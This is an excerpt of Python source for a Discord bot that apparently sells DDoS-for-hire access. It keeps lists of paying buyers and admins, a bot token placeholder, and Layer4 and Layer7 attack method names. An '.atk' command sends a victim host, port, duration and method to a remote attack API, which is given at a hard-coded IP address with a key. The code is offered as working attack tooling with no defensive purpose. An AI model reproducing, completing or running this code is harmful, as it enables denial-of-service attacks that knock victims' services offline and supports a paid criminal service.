...
buyers  = [1127966225268477962, 2, 3]              # Replace digits with Discord USER-IDs!
admins  = [1127966225268477962, 2, 3]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [1127966225268477962, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = 'your_token_lol'                  # Discord Bot token
bot     = commands.Bot(command_prefix='.')

l4methods = ['TCP', 'UDP', 'OVH', 'GAME']             # Our Layer4 methods. Add more if desired!
l7methods = ['BYPASS', 'BROWSER', 'TLS'] # Our Layer7 methods. Add more if desired!

# This is a list of dirs. We will use this for multiple API keys in the DDoS command.
api_data = [
    {
        'api_url':'http://45.93.200.142:1337/api/attack', # API URL #1
        'api_key':'tcpsynn',              # API KEY #1
...
@bot.command()
async def atk(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers: # They didn't buy the bot!!
        ...
        if method is None or method.upper() == 'HELP':
            ...
            embed.add_field(name="Syntax:", value=".atk <method> <target> <port> <time>")
            ...
            for i in api_data:
                try:
                    ...
                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?host={victim}&port={port}&time={time2}&method={methods.upper()}&key={api_key}')
